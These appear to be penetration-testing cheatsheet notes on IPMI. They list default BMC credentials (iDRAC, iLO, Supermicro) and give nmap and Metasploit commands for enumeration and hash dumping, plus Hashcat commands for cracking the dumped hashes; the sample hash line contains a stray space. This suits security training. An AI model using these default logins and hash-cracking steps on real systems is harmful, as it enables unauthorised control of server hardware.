[Intelligent Platform Management Interface](https://www.thomas-krenn.com/en/wiki/IPMI_Basics) (`IPMI`) is a set of standardized specifications for hardware-based host management systems used for system management and monitoring.

Some unique default passwords to keep in our cheatsheets include:

|Product|Username|Password|
|---|---|---|
|Dell iDRAC|root|calvin|
|HP iLO|Administrator|randomized 8-character string consisting of numbers and uppercase letters|
|Supermicro IPMI|ADMIN|ADMIN|



```bash
sudo nmap -sU --script ipmi-version -p 623 $TARGET
```

To use the Metasploit Version Scan

```bash - kali
msfconsole
```

```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
```

```
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts $TARGET
```

```
msf6 auxiliary(scanner/ipmi/ipmi_version) > run
```


 In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command  which tries all combinations of upper case letters and numbers for an eight-character password.
```bash
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

To retrieve IPMI hashes:

```bash - kali
msfconsole
```
```bash - kali
use auxiliary/scanner/ipmi/ipmi_dumphashes
```
```bash - kali
set RHOSTS $TARGET
```
```bash - kali
run
```

The hash for a user is retrieved. Let's save it in a file and use Hashcat to attempt to crack the hash.

```bash - kali
echo -n 3c08a6bf020500008edc65459227db9e4de83261ee2eafe9429a07eb96d30b745fef6f821dd97d81a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:80026d133489237175ee975d5dff53f 4c923b396 > hash
```

```bash - kali
hashcat -m 7300 hash /usr/share/wordlists/rockyou.txt
```